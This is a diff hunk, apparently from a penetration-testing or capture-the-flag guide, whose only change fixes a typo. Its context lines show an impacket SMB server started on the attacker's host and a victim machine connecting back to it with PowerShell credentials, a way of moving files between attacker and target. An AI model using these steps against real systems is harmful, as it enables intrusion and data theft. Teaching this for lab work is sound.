@@ -365,7 +365,7 @@ On your machine/host:
 sudo impacket-smbserver <shareName> $(pwd) -smb2support -user <user> -p <password>
 ```
 
-Then on the victim machine, we'll connect back to this SMB share, but first, we neet to specify the credentials mentioned in the above command. To do that, we’ll use the following commands:
+Then on the victim machine, we'll connect back to this SMB share, but first, we need to specify the credentials mentioned in the above command. To do that, we’ll use the following commands:
 
 ```text
 $pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
